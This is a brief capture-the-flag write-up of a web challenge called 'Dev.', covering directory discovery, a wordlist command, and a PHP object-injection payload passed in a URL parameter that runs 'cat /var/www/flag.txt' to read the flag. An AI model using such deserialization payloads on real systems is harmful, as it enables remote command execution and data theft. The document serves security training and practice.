# Dev.

1. It was necessary to bruteforce the file main.html.

2. The next step was to carefully examine the contents of the file, there was a hint.
   In the sentence: "We can also secretdev and keep secret with the help of such structures".
   The word "secretdev" stands out strongly. And it wasn't a TYPO!

3. One could assume that this is a hint and go to /secretdev.php 
   or make wordlist use command: 
   ctrl -d 5 -m 2 -w docswords.txt http://<domain>/

   And use it.

4. The next step is to examine the file, see the objects injection and bypass the restriction.

5. Payload: 
   http://<domain>/secretdev.php?deser=a:1:{i:0;O:5:%22test1%22:1:{s:6:%22logger%22;O:4:%22test%22:1:{s:9:%22close_cmd%22;s:21:%22cat%20/var/www/flag.txt%22;}}}

   ### Links to learn:
   https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Insecure%20Deserialization/PHP.md
